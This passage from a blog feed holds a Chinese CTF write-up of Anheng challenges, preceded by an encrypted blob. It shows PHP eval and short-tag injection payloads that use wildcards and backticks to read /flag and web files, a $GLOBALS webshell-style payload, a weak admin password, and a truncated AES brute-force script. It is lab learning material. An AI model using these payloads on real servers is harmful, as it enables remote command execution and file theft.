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 </div>]]></content>
    
    <summary type="html">
    
      实验课结束后发布
    
    </summary>
    
      <category term="CTF" scheme="0verwatch.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>安恒9月部分赛题复现</title>
    <link href="0verwatch.top/2018/09/30/anheng-9month/"/>
    <id>0verwatch.top/2018/09/30/anheng-9month/</id>
    <published>2018-09-30T05:41:02.000Z</published>
    <updated>2018-10-04T09:51:57.259Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>To be patient…</p></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>赶紧趁着电脑的屏幕修好了，刚好安恒的web题目有复现，赶紧做。。。。。又从这几个题目里面学习到新知识了<a id="more"></a>小结一下</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="babybypass"><a href="#babybypass" class="headerlink" title="babybypass"></a>babybypass</h4><p>这个题目我记得我当初做的时候是一直考虑着用<code>$</code>以及<code>_</code>去绕过这些数字字母之类的东西，突然发现他这个题目里面把那个<code>$</code>以及<code>_</code>也经过了过滤，这样的话就少了很多可能性，而且这题比原题的限制长度小了，更有难度。现在就开始总结一下从这个题目学到的知识点<br>1.php短标签输出，这个知识点很久之前就已经见过。<br><code>&lt;?=?&gt;</code>这个就是短标签，相当于<code>&lt;?php echo …;?&gt;</code>一般在php的配置文件<code>php.ini</code>中有一个<code>short_open_tag</code>的值，开启以后可以使用PHP的短标签：<code>&lt;? ?&gt;</code>，但是在现实开发中一般不推崇这种做法。。<br>但这个题目就很巧妙用了这个东西<br>2.第二个就是关于php函数eval函数的一些东西，这里的php执行函数是eval，在php官方手册上面有这样一句话，这是一个坑了，要想执行代码的话，我们就需要先用<code>?&gt;</code>去闭合，把上一段代码就给结束离开 ，然后我们才可以利用<code>&lt;?=?&gt;</code>去输出<br><a href="https://imgchr.com/i/ilI9II" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilI9II.md.png" alt="ilI9II.md.png"></a></p><p>区别一下有些系统执行函数比如system(有回显)，exec(没回显)，以及反引号这类的，这是直接执行系统函数的，一会我们也会用到<br><img src="https://s1.ax1x.com/2018/09/30/ilIPit.png" alt="ilIPit.png"><br><img src="https://s1.ax1x.com/2018/09/30/ilIiJP.png" alt="ilIiJP.png"></p><p>3.Linux通配符的作用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*        代表『 0 个或无穷多个』任意字符</span><br><span class="line">?        代表『一定有一个』任意字符</span><br></pre></td></tr></table></figure></p><p>4.Linux 下面一切皆文件<br>就是说我们平常一般在下面Linux下面的输入的命令，都可以通过文件去同样的执行，这对我来说是新知识。。。。。<br><img src="https://s1.ax1x.com/2018/09/30/ilIMiq.png" alt="ilIMiq.png"></p><p>然后我们就可以去实现payload，这个题目是Apache搭的，我们可以去默认目录先查看一波文件，一般来说默认目录在<code>/var/www/html</code></p><p>构造<code>code=?&gt;&lt;?=`/???/??? /???/???/????/*`;?&gt;</code>相当于<code>code=?&gt;&lt;?=` /bin/cat /var/www/html/*`;?&gt;</code></p><p>然后会发现php代码里面的源代码getflag那一部分的函数是是从/flag里面读取的。。。。听说这题的getflag函数也是个坑。。好像不能直接从url里面调用</p><p>所以再来构造一下<br><code>code=?&gt;&lt;?=`/???/??? /????`;?&gt;</code>相当于<code>code=?&gt;&lt;?=` /bin/cat /flag`;?&gt;</code>得到flag<br><a href="https://imgchr.com/i/ilIQJ0" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilIQJ0.md.png" alt="ilIQJ0.md.png"></a></p><h4 id="神奇的CMS"><a href="#神奇的CMS" class="headerlink" title="神奇的CMS"></a>神奇的CMS</h4><p>进入网站发现有用户登录，然后测试发现弱密码<br><code>admin admin123</code></p><p>然后点击几个模块发现有两个模块有点奇怪<br><a href="https://imgchr.com/i/ilIlWV" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilIlWV.md.png" alt="ilIlWV.md.png"></a></p><p>这两个模块一个模块有提示，另一个模块存在输入并且存在回显<br>先看提示，一是让你下载源码包，另外是提示flag在哪，先把源码包下载下来，源码里面有两个控制器，一个是<code>content</code>，另一个是<code>site</code></p><p>发现是Yii框架的东西，幸亏我还是做过Yii框架的开发的，对此还是有点小熟悉。。。</p><p>这里看回放的时候还是学到点东西的，就是我们在代码审计的时候一般要找有输入有输出的地方，这里很可能就存在这漏洞，这就相当于在脑里面建了一个模型，但是想想也很正常，平常我们学编程的时候也没过多的去考虑编程的输入输出，比如我们在一开始用C编程的时候你会忘掉除数不为0的前提吗？所以说我们更多的是考虑代码的核心功能能否实现。</p><p>所以在<code>ADD_IMG</code>(因为有输入有回显)页面里面就很有可能存在漏洞了，所以我们得专注代码里面描述这一段东西的内容</p><p> Yii框架讲究的是MVC架构，一般代码审计的话得先找<code>Controller</code>里面的东西毕竟都是些逻辑性的东西，关键的功能也在里面<br>所以在这个url里面的site是指的控制器，而backup就是site控制器里面的操作<br><img src="https://s1.ax1x.com/2018/09/30/ilI8QU.png" alt="ilI8QU.png"><br>我以前的博客讲过<br><a href="https://imgchr.com/i/ilIdF1" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilIdF1.md.png" alt="ilIdF1.md.png"></a></p><p>从代码里面你会发现<code>site</code>控制器里面都是些展示页面以及登陆的功能，但是不要过分以为登录里面会有sql注入，毕竟Yii框架里面是可以通过对login函数设置<code>rules</code>再来通过<code>validate</code>去检测是否出现SQL注入，所以出现sql注入机率不大</p><p>但是在回放里面学到了一种更骚气的代码调试的方法。。就是当你不懂框架的时候如何将其变成普通的php代码进行调试<br>这个方法就是将跟框架有关的东西去掉把关于框架的类看成一个普通的类，再把跟业务逻辑以及数据库相关操作的功能有关的去掉，然后新建那个类，单纯测试一下那个输入输出的函数就好</p><p>尝试调试，我这里用的phpstorm去调试，在<code>parstIf</code>函数下了断点，发现执行到下图所示的地方就会重新返回到echo输出语句中<br><a href="https://imgchr.com/i/ilIrQO" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilIrQO.md.png" alt="ilIrQO.md.png"></a><br>说明要在字符串里面加上<code>{if</code>此类的字符串<br>随便找一个地方加加，为的是能够进入else的循环<br><a href="https://imgchr.com/i/ilIbwj" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilIbwj.md.png" alt="ilIbwj.md.png"></a><br>进入else会发现到<code>buildregx</code>又会有一个新的函数，其实这个函数就是为了构建一个正则表达式，在字符串前后添加<code>/</code>，可以从debug的结果看得出来<br><a href="https://imgchr.com/i/ilIqTs" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilIqTs.md.png" alt="ilIqTs.md.png"></a><br>这时候我们就需要匹配<code>/{if:(.*?)}(.*?){end if}/is</code>这样的正则，但是之前的输入会导致其跳出该循环，从而又直接返回了结果，不能进入到for循环里面执行eval函数<br><a href="https://imgchr.com/i/ilIXYq" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilIXYq.md.png" alt="ilIXYq.md.png"></a><br>这时候就又需要构建对应的东西了，我们把正则里面的<code>(.*?)</code>改为自己随意的内容就好<br><a href="https://imgchr.com/i/ilIjf0" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilIjf0.md.png" alt="ilIjf0.md.png"></a><br>然后再追踪一次变化过程，经过<code>preg_match_all</code>这个函数的时候我们就可以看到这个函数会把原来的匹配的字符分成三段，首先是<code>iar[0][0]</code>是匹配到的字符串<code>{if:2333}23333{end if}</code>，然后是分别是第一个任意内容以及第二个任意内容匹正则配到的字符串，<code>iar[1][0]=2333,iar[2][0]=23333</code></p><p>继续走的话，这时候就可以进行一次循环了，因为现在arlen=1,然后我们就可以继续执行下去了，后买的事情就很简单了，先是判断<code>iar[1][0]</code>以及<code>iar[2][0]</code>里面是否有等号，再判断一下<code>iar[2][0]</code>里面是否有<code>{elseif</code>以及<code>else</code>，这几个判断都不影响<br><a href="https://imgchr.com/i/ilopXF" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilopXF.md.png" alt="ilopXF.md.png"></a><br>最后还是将<code>iar[1][0]</code>放在这个eval语句里面执行<br><a href="https://imgchr.com/i/iloCm4" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/iloCm4.md.png" alt="iloCm4.md.png"></a><br>梳理一下逻辑也就是说检查最少的是<code>iar[1][0]</code>，只检查他是否存在<code>=</code>，那就好办了，在eval语句中我们只需要对<code>iar[1][0</code>]闭合一下语句我们就可以执行我们想要的命令即可</p><p>Payload<br><code>{if:1)print_r(`cat /tmp/flag`);die();//}123{end if}</code>第一种思路直接在里面拼接命令执行语句即可<br><img src="https://s1.ax1x.com/2018/09/30/iloi79.png" alt="iloi79.png"></p><p>第二种思路就是在没有过滤<code>$GOLBALS</code>全局变量的前提下使用拼接，但个人感觉这东西会在PHP开发中给禁掉吧毕竟可能会对代码里面的其他变量造成影响，这个套路一般都是用来写过waf的小马用的</p><p><code>{if:1)$GLOBALS[&#39;_G&#39;.&#39;ET&#39;][a]($GLOBALS[&#39;_G&#39;.&#39;ET&#39;][b]);die();//}{end if}</code></p><p>尝试这个的是时候还以为服务器坏了。。。突然发现<code>processing request</code>。。。应该是没传参，传参了就好了</p><p><a href="https://imgchr.com/i/iloAt1" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/iloAt1.md.png" alt="iloAt1.md.png"></a></p><p><a href="https://imgchr.com/i/iloM0H" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/iloM0H.md.png" alt="iloM0H.md.png"></a><br><a href="https://imgchr.com/i/iloQ7d" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/iloQ7d.md.png" alt="iloQ7d.md.png"></a></p><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="简单加密"><a href="#简单加密" class="headerlink" title="简单加密"></a>简单加密</h4><p>这个题目帮我复习了一下信息安全数学基础第一章的内容，所以我就记录一下这个题目，其他题目就不写了</p><p>这个关键点就是作取余运算的时候结果是不会超过余数的，如果有打过ACM的人就会知道有一个叫快速幂的东西跟这个也差不多，极大地降低了代码所需要的空间度，使得数不会越界</p><p>观察主函数现在我们需要的就是<code>passwd</code>这个参数，但是从<code>generate_passwd</code>是得到最多<code>passwd</code>不会超过<code>0xB18E</code>，所以我们就可以选择爆破<br><a href="https://imgchr.com/i/ilo3tI" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/30/ilo3tI.md.png" alt="ilo3tI.md.png"></a></p><p>跑一下脚本就可以得到flag<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*- </span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto <span class="keyword">import</span> Random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(data, password)</span>:</span></span><br><span class="line">    bs = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + (bs - len(s) % bs) * chr(bs - len(s) % bs)</span><br><span class="line">    iv = <span class="string">"0102030405060708"</span></span><br><span class="line">    cipher = AES.new(password, AES.MODE_CBC, iv)</span><br><span class="line">    data = cipher.encrypt(pad(data))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(data, password)</span>:</span></span><br><span class="line">    unpad = <span class="keyword">lambda</span> s : s[<span class="number">0</span>:-ord(s[<span class="number">-1</span>])]</span><br><span class="line">    iv = <span class="string">"0102030405060708"</span></span><br><span class="line">    cipher = AES.new(password, AES.MODE_CBC, iv)</span><br><span class="line">    data  = cipher.decrypt(data)</span><br><span class="line">    <span class="keyword">return</span> unpad(data)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_passwd</span><span class="params">(key,result)</span>:</span></span><br><span class="line">    data_halt = <span class="string">"LvR7GrlG0A4WIMBrUwTFoA=="</span>.decode(<span class="string">"base64"</span>)</span><br><span class="line">    rand_int =  int(decrypt(data_halt, key).encode(<span class="string">"hex"</span>),<span class="number">16</span>)</span><br><span class="line">    <span class="comment">#round = 0x7DC59612</span></span><br><span class="line">    result = result * (rand_int % <span class="number">0xB18E</span>) % <span class="number">0xB18E</span></span><br><span class="line">    <span class="keyword">return</span> encrypt(str(result), key)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == 